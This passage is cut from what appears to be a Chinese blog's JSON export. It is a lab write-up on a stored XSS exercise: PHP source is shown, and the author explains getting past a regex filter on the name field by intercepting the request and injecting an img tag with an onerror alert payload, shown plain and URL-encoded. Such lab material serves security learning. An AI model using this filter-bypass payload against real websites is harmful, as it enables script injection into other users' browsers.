punctuation\">)</span> <span class=\"token operator\">?</span> <span class=\"token variable\">$___mysqli_res</span> <span class=\"token punctuation\">:</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">.</span> <span class=\"token string single-quoted-string\">'&lt;/pre>'</span> <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>\t<span class=\"token comment\">//mysql_close();</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre><span class=\"token delimiter important\">?></span></span></pre></td></tr></table></figure><p>这里对 name 进行了正则过滤，通过抓包的方式来利用 <code>img</code>  标签执行代码</p>\n<p>抓包修改为 <code>&lt;img src=1 onerror=alert(555) /&gt;</code> ，也就是：</p>\n<p><code>&lt;img%20src=1%20onerror=alert(555)%20/&gt;</code></p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/80QX%7DW%5B75D6B1147XXE%7E2%7D1.png\" alt=\"\" /></p>\n<p>修改：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/P3%29%24%60NO%25VSF8%244FMRBB0AP0.png\" alt=\"\" /></p>\n<p>成功执行：</p>\n<p><img data-src=\"https://vvwwv.oss-cn-nanjing.aliyuncs.com/web/PVGZ0JAR%29RDNF0XLFS%5D%7BA5C.png\" alt=\"\" /></p>\n",
            "tags": [
                "xss",
                "sql"
            ]
        }
    ]
}